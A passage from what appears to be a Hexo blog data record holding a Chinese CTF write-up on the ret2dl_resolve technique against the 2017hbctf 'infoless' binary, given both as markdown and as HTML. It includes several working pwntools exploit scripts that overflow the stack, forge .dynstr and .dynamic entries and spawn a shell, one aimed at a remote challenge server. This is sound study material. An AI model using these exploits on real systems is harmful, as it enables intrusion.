open('debug'))\n    payload1 = offset * 'a' + p32(plt_addr) + p32(reloc_args) + p32(elf.plt['fflush']) + p32(vuln_addr) + p32(bss_addr)\n    p.sendline(payload1)\n#    gdb.attach(p)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n最后在控制`eip`到`plt[0]`的位置时，我遇到了传参的问题，当我将`reloc_adgs`压入栈中后，我无法将将要调用函数`fflush()(事实上是systm())`的参数`/bin/sh\\x00`压入栈中了，这里可能需要用到rop去控制esp和栈的内容，暂时先不去研究这个。\n\n### 其他可能的利用？\n\n当我们可以控制`.dynamic`后是否可以改变别的值去控制程序（连接器？）解析到其他的地址上，是否还有其他的利用方式？\n\n### x64\n\n关于64位的利用方式应该是差不多的，暂时没精力研究了，先挖坑，以后填吧，先去研究沙盒了。\n\n## 叹\n\n还是太菜了，弄明白个这个玩意都要花接近一天。。。。TAT","source":"_posts/ret-2-dl-resolve.md","raw":"---\ntitle: ret_2_dl_resolve\ntags:\n  - PWN\n  - stack\n  - ret2dlresolve\ncategories: []\ndate: 2017-04-12 15:12:06\n---\n\n## 前言\n\n最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy binding就不难理解。\n\n## 利用方式\n> + 控制EIP为PLT[0]的地址，只需传递一个index_arg参数\n+ 控制index_arg的大小，使reloc的位置落在可控地址内\n+ 伪造reloc的内容，使sym落在可控地址内\n+ 伪造sym的内容，使name落在可控地址内\n+ 伪造name为任意库函数，如system\n\n所以我们得出结论，我们最终要伪造三个节信息，分别是`.rel.plt`, `.dynsym`, `.dynstr`，并且在`dynstr`上布置我们希望调用的函数的`str`，比如`system`。并且我们要通过控制`index_args`参数和`eip`指针是的程序按照我们的设计来调用函数。\n\n## Example\n\n以2017hbctf第一场的pwn200来分析\n\n程序逻辑\n```\nint __cdecl main()\n{\n  setvbuf(stdin, 0, 2, 0);\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stderr, 0, 2, 0);\n  read_buf();\n  fflush(stdout);\n  return 0;\n}\n```\n```\nssize_t read_buf()\n{\n  char buf; // [sp+6h] [bp-12h]@1\n\n  return read(0, &buf, 0x3Cu);\n}\n```\n\nchecksec\n```\nroot@kali ~/c/2/p/infoless# checksec infoless \n[*] '/root/ctf-problem/2017hbctf/pwn/infoless/infoless'\n    Arch:     i386-32-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n除此之外就没有信息了，所以这题考察的就是如何在缺少信息的情况下getshell，这里用到的一种技术就是ret_2_dl_resolve。\n\n关于`.dynamic`：\n```\nroot@kali ~/c/2/p/infoless# readelf -d infoless \n\nDynamic section at offset 0x70c contains 24 entries:\n  标记        类型                         名称/值\n 0x00000001 (NEEDED)                     共享库：[libc.so.6]\n 0x0000000c (INIT)                       0x8048340\n 0x0000000d (FINI)                       0x80485c4\n 0x00000019 (INIT_ARRAY)                 0x8049700\n 0x0000001b (INIT_ARRAYSZ)               4 (bytes)\n 0x0000001a (FINI_ARRAY)                 0x8049704\n 0x0000001c (FINI_ARRAYSZ)               4 (bytes)\n 0x6ffffef5 (GNU_HASH)                   0x804818c\n 0x00000005 (STRTAB)                     0x804825c\n 0x00000006 (SYMTAB)                     0x80481bc\n 0x0000000a (STRSZ)                      109 (bytes)\n 0x0000000b (SYMENT)                     16 (bytes)\n 0x00000015 (DEBUG)                      0x0\n 0x00000003 (PLTGOT)                     0x80497f8\n 0x00000002 (PLTRELSZ)                   32 (bytes)\n 0x00000014 (PLTREL)                     REL\n 0x00000017 (JMPREL)                     0x8048320\n 0x00000011 (REL)                        0x8048300\n 0x00000012 (RELSZ)                      32 (bytes)\n 0x00000013 (RELENT)                     8 (bytes)\n 0x6ffffffe (VERNEED)                    0x80482e0\n 0x6fffffff (VERNEEDNUM)                 1\n 0x6ffffff0 (VERSYM)                     0x80482ca\n 0x00000000 (NULL)                       0x0\n```\nELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。\n\n通过半天多的努力终于算是理解掌握了ret_to_dl_resolve的利用方法。。正如如上所说，这里的关键点是理解linux的lazy binding的工作方式，由于要伪造三个节信息并且完全计算偏移，所以我认为不熟练的话还是需要花时间调试offset的。但是我看了别人的解法后发现了一个问题，那就是似乎`.dynamic`节似乎是可写的，那么我们似乎可以通过修改`.dynamic`的偏移信息使得直接定位`.dynstr`的地址到我们伪造的`.dynstr(bss)`上了。\n\n参考exp:\n```\n#!/usr/bin/python\n# -*- coding:utf-8 -*- \n \nfrom pwn import *\nfrom time import *\n \nvulFunAddr = 0x080484CB\nreadpltAddr = 0x08048380\nfflushpltAddr = 0x08048390\ndynstrInDynamicAddr = 0x08049750\nbssAddr = 0x08049820\n \nstrTable = ['', 'libc.so.6','_IO_stdin_used', 'fflush', 'stdin', 'read', 'stdout', 'stderr', 'setvbuf','__libc_start_main', '__gmon_start__', 'GLIBC_2.0', '']\nstrTable[3] = 'system'\n#将伪造的dynstr表中的fflush函数给换成system\nbinShellStr = '/bin/sh\\0'\nexpOffset = 22\npayloadHead = 'a'*expOffset\n \ndef writeStrTableToBSS(baseAddr):\n   tempBSS = baseAddr\n    #循环写入伪造的dynstr表\n   for i in strTable:\n       str = i + chr(0)\n       payloadTemp = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(0)+ p32(tempBSS) + p32(len(str)+1)\n       p.send(payloadTemp)\n       sleep(0.1)\n       p.send(str)\n       tempBSS = tempBSS + len(str)\n       sleep(0.1)\n \np = remote('123.206.81.66', 8888)\n#p = remote('127.0.0.1', 8888)\n#p = process('./infoless')\ncontext.log_level = 'debug'\n \n#step 1: 将binShStr写入可写的bss段中\npayload1 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(bssAddr) + p32(8)\np.send(payload1)\nsleep(0.1)\np.send(binShellStr)\nsleep(0.1)\n \n#step 2: 将伪造的dynstr表写入binShStr后面\ndynstrInBSSAddr = bssAddr +len(binShellStr) + 4\nwriteStrTableToBSS(dynstrInBSSAddr)\n \n#step 3: 将伪造的dynstr表地址写入dynamic中相对应的索引地址\npayload2 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(0) + p32(dynstrInDynamicAddr) + p32(4)\np.send(payload2)\nsleep(0.1)\np.send(p32(dynstrInBSSAddr))\nsleep(0.1)\n \n#step 4：getshell\npayload3 = payloadHead + p32(fflushpltAddr)+ p32(vulFunAddr) + p32(bssAddr)\np.send(payload3)\nsleep(0.1)\n\np.interactive()\n```\n\n## 思考\n\n于是我有了一个想法，既然`.dynamic`节是可写的，那么`.dynstr`节是否可写呢？其他的节是否还存在可写的呢，节是否可写是否有标志位给出呢？于是我进行了以下的测试。\n\n### 测试`.dynstr`节是否可写\n\nexp:\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./infoless')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\noffset = 22\nelf = ELF('./infoless')\nread_plt = elf.symbols['read']\nvuln_addr = 0x80484CB\nbss_addr = 0x8049820\nfflush_plt = elf.symbols['fflush']\n\ndef pwn():\n\n    addr = bss_addr\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)\n    p.sendline(payload1)\n    payload2 = '/bin/sh\\x00'.ljust(20, 'a')\n    p.sendline(payload2)\n\n    addr = 0x8048276\n    gdb,attach(p)\n    payload1 = offset * 'b' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n    p.sendline(payload1)\n    payload2 = 'system\\x00'\n    p.sendline(payload2)\n\n    payload1 = 14 * 'c' + p32(fflush_plt) + p32(0) + p32(bss_addr)\n    p.sendline(payload1)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n嗯，测试结果不可写= =，但是当我们尝试去写的时候似乎不会报错？（应该是有一个address fault的呀- -）。\n\n### 节的权限\n\n通过gdb的vmmap可以得到权限。当ELF文件被加载到内存中后，系统会将多个具有相同权限Section(节)合并成一个Segment(段)，通常为代码段(可读可执行)，可读可写的数据段，和只读数据段。\n\n```\nwndbg> vmmap \nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n 0x8048000  0x8049000 r-xp     1000 0      /root/ctf-problem/2017hbctf/pwn/infoless/infoless\n 0x8049000  0x804a000 rw-p     1000 0      /root/ctf-problem/2017hbctf/pwn/infoless/infoless\n0xf7dfa000 0xf7dfc000 rw-p     2000 0      \n0xf7dfc000 0xf7fad000 r-xp   1b1000 0      /lib32/libc-2.24.so\n0xf7fad000 0xf7faf000 r--p     2000 1b0000 /lib32/libc-2.24.so\n0xf7faf000 0xf7fb0000 rw-p     1000 1b2000 /lib32/libc-2.24.so\n0xf7fb0000 0xf7fb3000 rw-p     3000 0      \n0xf7fd2000 0xf7fd4000 rw-p     2000 0      \n0xf7fd4000 0xf7fd7000 r--p     3000 0      [vvar]\n0xf7fd7000 0xf7fd9000 r-xp     2000 0      [vdso]\n0xf7fd9000 0xf7ffb000 r-xp    22000 0      /lib32/ld-2.24.so\n0xf7ffc000 0xf7ffd000 r--p     1000 22000  /lib32/ld-2.24.so\n0xf7ffd000 0xf7ffe000 rw-p     1000 23000  /lib32/ld-2.24.so\n0xfffdd000 0xffffe000 rw-p    21000 0      [stack]\n```\n\n### 关于传参\n\n我的一个失败的exp：\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 1\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./infoless')\nelse:\n    p = remote()\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\n\nelf = ELF('./infoless')\n\noffset = 22\n# .rel.plt  reloc = reloc + .rel.plt , fake reloc_args to locate reloc on bss\n\n# .dynsym   sym = .dynsym + reloc->info , fake reloc->info to locate sym on bss\n\n# .dynstr   name = .dynstr + sym->value, fake sym->value to locate name on bss\n\n#  name_str fake name_str on bss\n\npr = 0x08048361\nrelplt_addr = 0x8048320\nvuln_addr = 0x80484CB\nplt_addr = 0x8048370\nbss_addr = 0x8049820\ndynsym_addr = 0x80481bc\ndynstr_addr = 0x0804825c\nread_plt = elf.symbols['read']\n\ndef pwn():\n    print 'bss_addr => ', hex(bss_addr)\n\n    # send /bin/sh\n    addr = bss_addr\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(100)\n    p.sendline(payload1)\n    payload2 = '/bin/sh\\x00'.ljust(20, 'a')\n    p.sendline(payload2)\n    \n    # fake .rel.plt on bss\n    # 0x0804970c      0x00000107\n    addr += len(payload2)\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n#    gdb.attach(p, open('debug'))\n    p.sendline(payload1)\n    print 'addr - relplt_addr => ', hex(addr - relplt_addr)\n    off = ((addr - dynsym_addr) / 0x10 + 1) * 0x100 + 0x7\n    print 'off => ', hex(off)\n    payload2 = p32(elf.got['fflush']) + p32(off)\n    p.sendline(payload2)\n#    gdb.attach(p)\n\n    # fake .dynsym on bss\n    # 0x0000001a      0x00000000      0x00000000      0x00000012\n    addr += len(payload2)\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n    p.sendline(payload1)\n    off = addr - dynstr_addr + 0x10\n    print 'offset_dynstr => ', hex(off) # 15f0\n    payload2 = p32(off) + p32(0) + p32(0) + p32(0x12)\n#    gdb.attach(p, open('debug'))\n    p.sendline(payload2)\n\n    # fake .dynstr\n    addr += len(payload2)\n    payload1 = offset * 'a' + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(addr) + p32(100)\n    p.sendline(payload1)\n#    gdb.attach(p, open('debug'))\n    payload2 = 'system\\x00'\n    p.sendline(payload2)\n#    gdb.attach(p, open('debug'))\n\n    # fake reloc_args & mov eip, plt[0]\n    reloc_args = bss_addr - relplt_addr + 0x14\n    print 'reloc_args => ', hex(reloc_args)\n    gdb.attach(p, open('debug'))\n    payload1 = offset * 'a' + p32(plt_addr) + p32(reloc_args) + p32(elf.plt['fflush']) + p32(vuln_addr) + p32(bss_addr)\n    p.sendline(payload1)\n#    gdb.attach(p)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n最后在控制`eip`到`plt[0]`的位置时，我遇到了传参的问题，当我将`reloc_adgs`压入栈中后，我无法将将要调用函数`fflush()(事实上是systm())`的参数`/bin/sh\\x00`压入栈中了，这里可能需要用到rop去控制esp和栈的内容，暂时先不去研究这个。\n\n### 其他可能的利用？\n\n当我们可以控制`.dynamic`后是否可以改变别的值去控制程序（连接器？）解析到其他的地址上，是否还有其他的利用方式？\n\n### x64\n\n关于64位的利用方式应该是差不多的，暂时没精力研究了，先挖坑，以后填吧，先去研究沙盒了。\n\n## 叹\n\n还是太菜了，弄明白个这个玩意都要花接近一天。。。。TAT","slug":"ret-2-dl-resolve","published":1,"updated":"2017-04-13T02:03:34.326Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k3c004ghv183680rkjr","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy binding就不难理解。</p>\n<h2 id=\"利用方式\"><a href=\"#利用方式\" class=\"headerlink\" title=\"利用方式\"></a>利用方式</h2><blockquote>\n<ul>\n<li>控制EIP为PLT[0]的地址，只需传递一个index_arg参数</li>\n<li>控制index_arg的大小，使reloc的位置落在可控地址内</li>\n<li>伪造reloc的内容，使sym落在可控地址内</li>\n<li>伪造sym的内容，使name落在可控地址内</li>\n<li>伪造name为任意库函数，如system</li>\n</ul>\n</blockquote>\n<p>所以我们得出结论，我们最终要伪造三个节信息，分别是<code>.rel.plt</code>, <code>.dynsym</code>, <code>.dynstr</code>，并且在<code>dynstr</code>上布置我们希望调用的函数的<code>str</code>，比如<code>system</code>。并且我们要通过控制<code>index_args</code>参数和<code>eip</code>指针是的程序按照我们的设计来调用函数。</p>\n<h2 id=\"Example\"><a href=\"#Example\" class=\"headerlink\" title=\"Example\"></a>Example</h2><p>以2017hbctf第一场的pwn200来分析</p>\n<p>程序逻辑<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">int __cdecl main()</div><div class=\"line\">&#123;</div><div class=\"line\">  setvbuf(stdin, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</div><div class=\"line\">  setvbuf(stdout, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</div><div class=\"line\">  setvbuf(stderr, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</div><div class=\"line\">  read_buf();</div><div class=\"line\">  fflush(stdout);</div><div class=\"line\">  return <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight aspectj\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\">ssize_t <span class=\"title\">read_buf</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [sp+6h] [bp-12h]@1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">return</span> <span class=\"title\">read</span><span class=\"params\">(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x3C</span>u)</span></span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>checksec<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/<span class=\"number\">2</span>/p/infoless<span class=\"comment\"># checksec infoless </span></div><div class=\"line\">[*] <span class=\"string\">'/root/ctf-problem/2017hbctf/pwn/infoless/infoless'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     i386<span class=\"bullet\">-32</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    <span class=\"literal\">No</span> RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    <span class=\"literal\">No</span> canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE (<span class=\"number\">0x8048000</span>)</div></pre></td></tr></table></figure></p>\n<p>除此之外就没有信息了，所以这题考察的就是如何在缺少信息的情况下getshell，这里用到的一种技术就是ret_2_dl_resolve。</p>\n<p>关于<code>.dynamic</code>：<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">root</span>@<span class=\"selector-tag\">kali</span> ~/<span class=\"selector-tag\">c</span>/<span class=\"selector-tag\">2</span>/<span class=\"selector-tag\">p</span>/<span class=\"selector-tag\">infoless</span># <span class=\"selector-tag\">readelf</span> <span class=\"selector-tag\">-d</span> <span class=\"selector-tag\">infoless</span> </div><div class=\"line\"></div><div class=\"line\"><span class=\"selector-tag\">Dynamic</span> <span class=\"selector-tag\">section</span> <span class=\"selector-tag\">at</span> <span class=\"selector-tag\">offset</span> <span class=\"selector-tag\">0x70c</span> <span class=\"selector-tag\">contains</span> <span class=\"selector-tag\">24</span> <span class=\"selector-tag\">entries</span>:</div><div class=\"line\">  标记        类型                         名称/值</div><div class=\"line\"> <span class=\"selector-tag\">0x00000001</span> (NEEDED)                     共享库：<span class=\"selector-attr\">[libc.so.6]</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000000c</span> (INIT)                       <span class=\"selector-tag\">0x8048340</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000000d</span> (FINI)                       <span class=\"selector-tag\">0x80485c4</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000019</span> (INIT_ARRAY)                 <span class=\"selector-tag\">0x8049700</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000001b</span> (INIT_ARRAYSZ)               <span class=\"selector-tag\">4</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x0000001a</span> (FINI_ARRAY)                 <span class=\"selector-tag\">0x8049704</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000001c</span> (FINI_ARRAYSZ)               <span class=\"selector-tag\">4</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x6ffffef5</span> (GNU_HASH)                   <span class=\"selector-tag\">0x804818c</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000005</span> (STRTAB)                     <span class=\"selector-tag\">0x804825c</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000006</span> (SYMTAB)                     <span class=\"selector-tag\">0x80481bc</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000000a</span> (STRSZ)                      <span class=\"selector-tag\">109</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x0000000b</span> (SYMENT)                     <span class=\"selector-tag\">16</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x00000015</span> (DEBUG)                      <span class=\"selector-tag\">0x0</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000003</span> (PLTGOT)                     <span class=\"selector-tag\">0x80497f8</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000002</span> (PLTRELSZ)                   <span class=\"selector-tag\">32</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x00000014</span> (PLTREL)                     <span class=\"selector-tag\">REL</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000017</span> (JMPREL)                     <span class=\"selector-tag\">0x8048320</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000011</span> (REL)                        <span class=\"selector-tag\">0x8048300</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000012</span> (RELSZ)                      <span class=\"selector-tag\">32</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x00000013</span> (RELENT)                     <span class=\"selector-tag\">8</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x6ffffffe</span> (VERNEED)                    <span class=\"selector-tag\">0x80482e0</span></div><div class=\"line\"> <span class=\"selector-tag\">0x6fffffff</span> (VERNEEDNUM)                 <span class=\"selector-tag\">1</span></div><div class=\"line\"> <span class=\"selector-tag\">0x6ffffff0</span> (VERSYM)                     <span class=\"selector-tag\">0x80482ca</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000000</span> (NULL)                       <span class=\"selector-tag\">0x0</span></div></pre></td></tr></table></figure></p>\n<p>ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。</p>\n<p>通过半天多的努力终于算是理解掌握了ret_to_dl_resolve的利用方法。。正如如上所说，这里的关键点是理解linux的lazy binding的工作方式，由于要伪造三个节信息并且完全计算偏移，所以我认为不熟练的话还是需要花时间调试offset的。但是我看了别人的解法后发现了一个问题，那就是似乎<code>.dynamic</code>节似乎是可写的，那么我们似乎可以通过修改<code>.dynamic</code>的偏移信息使得直接定位<code>.dynstr</code>的地址到我们伪造的<code>.dynstr(bss)</code>上了。</p>\n<p>参考exp:<br><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"meta\"># -*- coding:utf-8 -*- </span></div><div class=\"line\"> </div><div class=\"line\">from pwn import *</div><div class=\"line\">from time import *</div><div class=\"line\"> </div><div class=\"line\">vulFunAddr = <span class=\"number\">0x080484CB</span></div><div class=\"line\">readpltAddr = <span class=\"number\">0x08048380</span></div><div class=\"line\">fflushpltAddr = <span class=\"number\">0x08048390</span></div><div class=\"line\">dynstrInDynamicAddr = <span class=\"number\">0x08049750</span></div><div class=\"line\">bssAddr = <span class=\"number\">0x08049820</span></div><div class=\"line\"> </div><div class=\"line\">strTable = [<span class=\"string\">''</span>, <span class=\"string\">'libc.so.6'</span>,<span class=\"string\">'_IO_stdin_used'</span>, <span class=\"string\">'fflush'</span>, <span class=\"string\">'stdin'</span>, <span class=\"string\">'read'</span>, <span class=\"string\">'stdout'</span>, <span class=\"string\">'stderr'</span>, <span class=\"string\">'setvbuf'</span>,<span class=\"string\">'__libc_start_main'</span>, <span class=\"string\">'__gmon_start__'</span>, <span class=\"string\">'GLIBC_2.0'</span>, <span class=\"string\">''</span>]</div><div class=\"line\">strTable[<span class=\"number\">3</span>] = <span class=\"string\">'system'</span></div><div class=\"line\"><span class=\"meta\">#将伪造的dynstr表中的fflush函数给换成system</span></div><div class=\"line\">binShellStr = <span class=\"string\">'/bin/sh\\0'</span></div><div class=\"line\">expOffset = <span class=\"number\">22</span></div><div class=\"line\">payloadHead = <span class=\"string\">'a'</span>*expOffset</div><div class=\"line\"> </div><div class=\"line\">def writeStrTableToBSS(baseAddr):</div><div class=\"line\">   tempBSS = baseAddr</div><div class=\"line\">    <span class=\"meta\">#循环写入伪造的dynstr表</span></div><div class=\"line\">   <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> strTable:</div><div class=\"line\">       str = i + <span class=\"built_in\">chr</span>(<span class=\"number\">0</span>)</div><div class=\"line\">       payloadTemp = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(<span class=\"number\">0</span>)+ p32(tempBSS) + p32(len(str)+<span class=\"number\">1</span>)</div><div class=\"line\">       p.<span class=\"built_in\">send</span>(payloadTemp)</div><div class=\"line\">       <span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\">       p.<span class=\"built_in\">send</span>(str)</div><div class=\"line\">       tempBSS = tempBSS + len(str)</div><div class=\"line\">       <span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"> </div><div class=\"line\">p = remote(<span class=\"string\">'123.206.81.66'</span>, <span class=\"number\">8888</span>)</div><div class=\"line\"><span class=\"meta\">#p = remote(<span class=\"string\">'127.0.0.1'</span>, 8888)</span></div><div class=\"line\"><span class=\"meta\">#p = process(<span class=\"string\">'./infoless'</span>)</span></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 1: 将binShStr写入可写的bss段中</span></div><div class=\"line\">payload1 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(<span class=\"number\">0</span>) + p32(bssAddr) + p32(<span class=\"number\">8</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(payload1)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(binShellStr)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 2: 将伪造的dynstr表写入binShStr后面</span></div><div class=\"line\">dynstrInBSSAddr = bssAddr +len(binShellStr) + <span class=\"number\">4</span></div><div class=\"line\">writeStrTableToBSS(dynstrInBSSAddr)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 3: 将伪造的dynstr表地址写入dynamic中相对应的索引地址</span></div><div class=\"line\">payload2 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(<span class=\"number\">0</span>) + p32(dynstrInDynamicAddr) + p32(<span class=\"number\">4</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(payload2)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(p32(dynstrInBSSAddr))</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 4：getshell</span></div><div class=\"line\">payload3 = payloadHead + p32(fflushpltAddr)+ p32(vulFunAddr) + p32(bssAddr)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(payload3)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"></div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h2><p>于是我有了一个想法，既然<code>.dynamic</code>节是可写的，那么<code>.dynstr</code>节是否可写呢？其他的节是否还存在可写的呢，节是否可写是否有标志位给出呢？于是我进行了以下的测试。</p>\n<h3 id=\"测试-dynstr节是否可写\"><a href=\"#测试-dynstr节是否可写\" class=\"headerlink\" title=\"测试.dynstr节是否可写\"></a>测试<code>.dynstr</code>节是否可写</h3><p>exp:<br><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div 